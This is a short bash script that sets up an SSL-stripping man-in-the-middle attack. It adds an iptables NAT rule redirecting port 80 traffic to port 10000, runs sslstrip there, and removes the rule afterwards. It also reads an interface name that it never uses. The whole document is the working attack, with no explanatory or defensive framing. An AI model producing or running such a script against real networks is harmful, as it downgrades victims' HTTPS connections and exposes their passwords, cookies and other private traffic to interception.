#!/bin/bash
interface=`ifconfig|cut -d " " -f1|cut -d ":" -f 1|head -1`
port=10000

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port

sslstrip -l $port


iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
